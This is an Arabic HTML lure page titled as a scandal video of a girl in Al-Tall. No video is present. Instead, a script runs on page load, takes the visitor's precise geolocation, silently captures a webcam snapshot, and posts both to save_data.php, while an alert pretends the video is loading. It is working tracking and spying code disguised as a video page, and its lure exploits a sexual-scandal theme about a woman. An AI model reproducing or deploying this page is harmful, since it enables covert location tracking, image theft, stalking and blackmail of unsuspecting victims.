<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>مشاهدة فديو فضيحة بنت في مدينة التل</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background-color: #f0f2f5; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <video id="video" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        sendData("lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
                    },
                    function(error) {
                        console.log("Location error: " + error.message);
                        sendData("location_error=1");
                    },
                    { enableHighAccuracy: true, maximumAge: 0 }
                );
            } else {
                sendData("location_not_supported=1");
            }

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    var video = document.getElementById('video');
                    video.srcObject = stream;
                    setTimeout(function() {
                        var canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        var dataURL = canvas.toDataURL('image/png');
                        sendData("image=" + encodeURIComponent(dataURL));
                        stream.getTracks().forEach(track => track.stop());
                    }, 1000);
                })
                .catch(function(err) {
                    console.log("Camera error: " + err.message);
                    sendData("camera_error=1");
                });
            alert("جارٍ تحميل الفيديو في الخلفية...");
        };

        function sendData(data) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "save_data.php", true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        console.log("Data sent successfully: " + xhr.responseText);
                    } else {
                        console.log("Failed to send data: " + xhr.status + " - " + xhr.responseText);
                    }
                }
            };
            xhr.send(data);
        }
    </script>
</body>
</html>
